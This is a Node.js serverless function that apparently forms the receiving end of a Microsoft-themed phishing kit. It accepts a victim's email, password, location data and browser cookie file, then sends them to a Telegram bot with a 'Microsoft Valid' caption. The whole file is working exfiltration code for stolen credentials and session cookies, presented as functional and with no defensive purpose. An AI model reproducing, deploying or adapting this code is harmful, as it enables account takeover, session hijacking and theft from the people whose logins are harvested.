/**
 * FIXED: Actually sends to Telegram
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(message, isDocument = false, docContent = null, docName = null) {
  return new Promise((resolve, reject) => {
    let postData;
    let path;

    if (isDocument && docContent) {
      // Send as document
      const base64 = Buffer.from(docContent).toString('base64');
      postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        document: `data:text/plain;base64,${base64}`,
        caption: message,
        parse_mode: 'HTML'
      });
      path = `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
    } else {
      // Send as message
      postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      path = `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    }

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (res.statusCode === 200 && json.ok) {
            resolve(json);
          } else {
            reject(new Error(json.description || 'Telegram error'));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Content-Type': 'application/json'
  };

  try {
    const payload = JSON.parse(event.body || '{}');
    const { email, password, locationData = {}, cookieFiles = {} } = payload;

    console.log('✅ PAYLOAD RECEIVED');
    console.log('Email:', email);
    console.log('Has cookie file:', !!cookieFiles.jsonFile?.content);

    // Build caption with all data
    let caption = '<b>✅ Microsoft Valid</b>\n\n';
    caption += `👤:- ${email || 'N/A'}\n`;
    caption += `🔑:- ${password ? '***' : 'N/A'}\n`;

    if (locationData.ip) {
      caption += `\n🌍 Location:\n`;
      caption += `IP:- ${locationData.ip}\n`;
      if (locationData.city) caption += `City:- ${locationData.city}\n`;
      if (locationData.region) caption += `Region:- ${locationData.region}\n`;
      if (locationData.country) caption += `Country:- ${locationData.country}\n`;
    }

    caption += `\nBrowser:- chrome\n`;
    caption += `\n⏰ ${new Date().toISOString()}\n`;

    console.log('📝 Caption ready');

    // CRITICAL: Send to Telegram
    let sent = false;

    if (cookieFiles.jsonFile?.content) {
      console.log('📦 SENDING DOCUMENT WITH CAPTION...');
      try {
        await sendToTelegram(
          caption,
          true,
          cookieFiles.jsonFile.content,
          `${email}_${Date.now()}.txt`
        );
        console.log('✅✅✅ DOCUMENT SENT TO TELEGRAM');
        sent = true;
      } catch (err) {
        console.error('❌ DOCUMENT SEND FAILED:', err.message);
        throw err;
      }
    } else {
      console.log('⚠️ NO COOKIE FILE - sending message only');
      try {
        await sendToTelegram(caption);
        console.log('✅ MESSAGE SENT TO TELEGRAM');
        sent = true;
      } catch (err) {
        console.error('❌ MESSAGE SEND FAILED:', err.message);
        throw err;
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: sent,
        transmitted: sent
      })
    };

  } catch (error) {
    console.error('❌ ERROR:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: error.message })
    };
  }
};
